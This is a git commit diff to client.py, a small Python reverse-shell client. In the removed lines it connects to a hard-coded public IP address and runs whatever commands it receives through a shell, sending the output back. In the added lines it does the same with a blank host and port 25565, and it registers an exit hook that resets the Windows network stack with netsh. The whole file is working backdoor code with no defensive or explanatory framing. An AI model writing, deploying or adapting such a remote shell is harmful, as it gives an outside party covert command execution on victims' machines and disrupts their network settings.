b93c80b07ab36ccc639355410d37867f39fd8d39
An0rak <phos4es@gmail.com>
2017-05-14 21:58:10 -0400

    'asd

--- client.py
+++ client.py
@@ -1,20 +1,26 @@
 #!/usr/bin/python
-import socket, os
-import subprocess as sub
-
+import socket, sys, atexit
+from os import chdir
+from subprocess import check_output, call
 s = socket.socket()
-host = '173.79.253.233'
-port = 37531
+host = ''
+port = 25565
 
-def parse_input(recv_string):
-    process = sub.Popen(
-    args=recv_string,
-    stdout=sub.PIPE,
-    shell=True
-    )
-    return process.communicate()[0]
+def cleanup():
+    call(['netsh int ip reset resetlog.txt',])
 
-s.connect((host,port))
-while True:
-    s.send(parse_input(s.recv(1024)))
-s.close()
+def parse_input(input_string):
+    if 'cd' in input_string:
+        path = input_string.split(" ")
+        chdir(path[1])
+    else:
+        s.send(check_output(input_string))
+try:
+    s.connect((host,port))
+    while True:
+        parse_input(s.recv(1024))
+    s.close()
+except Exception as e:
+    s.send("\n Connection Closed")
+    s.close()
+atexit.register(cleanup)
